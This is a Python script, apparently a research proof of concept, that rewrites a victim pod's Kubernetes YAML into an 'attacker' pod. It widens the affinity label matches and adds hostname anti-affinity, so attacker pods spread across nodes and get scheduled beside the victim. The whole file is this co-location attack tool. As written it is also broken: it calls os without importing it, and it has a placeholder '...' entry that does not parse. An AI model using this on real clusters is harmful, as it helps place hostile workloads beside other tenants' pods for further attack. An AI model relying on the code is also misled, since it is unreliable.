import sys
import yaml
import random
import string

# The attacker extends the victim pod’s affinity condition by appending 
# additional values from the labels of pods likely to be co-located with the victim.
# (→ Fill in with the victim pod and the labels of pods likely to be co-located with it)
pod_affinity_data = {
    "app": [...],
    "environment": [...],
    "version": [...],
    "component": [...],
    "instance": [...],
    "part-of": [...],
    ...
}

def generate_instance_value():
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=6))

def main():
    if len(sys.argv) < 3:
        print("Usage: python3 script.py <pod_yaml_file> <output_dir>")
        sys.exit(1)

    input_file = sys.argv[1]
    output_dir = sys.argv[2]
    os.makedirs(output_dir, exist_ok=True)

    with open(input_file, "r") as f:
        pod_yaml = yaml.safe_load(f)

    pod_yaml["metadata"]["name"] = "attacker"

    # add attacker label(spreading label)
    if "labels" not in pod_yaml["metadata"]:
        pod_yaml["metadata"]["labels"] = {}
    pod_yaml["metadata"]["labels"]["spread"] = "label"

    # extract podAffinity labelSelector
    affinity = pod_yaml.get("spec", {}).get("affinity", {})
    affinity_terms = affinity.get("podAffinity", {}).get("preferredDuringSchedulingIgnoredDuringExecution", [])

    for term in affinity_terms:
        label_selector = term.get("podAffinityTerm", {}).get("labelSelector", {})
        match_expressions = label_selector.get("matchExpressions", [])

        for expr in match_expressions:
            key = expr.get("key")
            values = expr.get("values", [])

            if key in pod_affinity_data:
                extra_candidates = pod_affinity_data[key]

                if key == "instance":
                    new_values = [generate_instance_value() for _ in range(2)]
                elif extra_candidates:
                    # Select two random values excluding the existing ones.
                    available = [v for v in extra_candidates if v not in values]
                    new_values = random.sample(available, k=min(2, len(available)))
                else:
                    new_values = []

                expr["values"].extend(new_values)

    # apply spreading label
    affinity["podAntiAffinity"] = {
        "requiredDuringSchedulingIgnoredDuringExecution": [
            {
                "labelSelector": {
                    "matchExpressions": [
                        {
                            "key": "spread",
                            "operator": "In",
                            "values": ["label"]
                        }
                    ]
                },
                "topologyKey": "kubernetes.io/hostname"
            }
        ]
    }
    pod_yaml["spec"]["affinity"] = affinity

    # replace containers config
    pod_yaml["spec"]["containers"] = [
        {
            "image": "nginx:latest",
            "imagePullPolicy": "IfNotPresent",
            "name": "attack-container"
        }
    ]

    out_path = os.path.join(output_dir, "attacker.yaml")
    with open(out_path, "w") as fo:
        yaml.safe_dump(pod_yaml, fo, sort_keys=False, default_flow_style=False)

    print(f"Created attack pod saved in '{out_path}':")

if __name__ == "__main__":
    main()
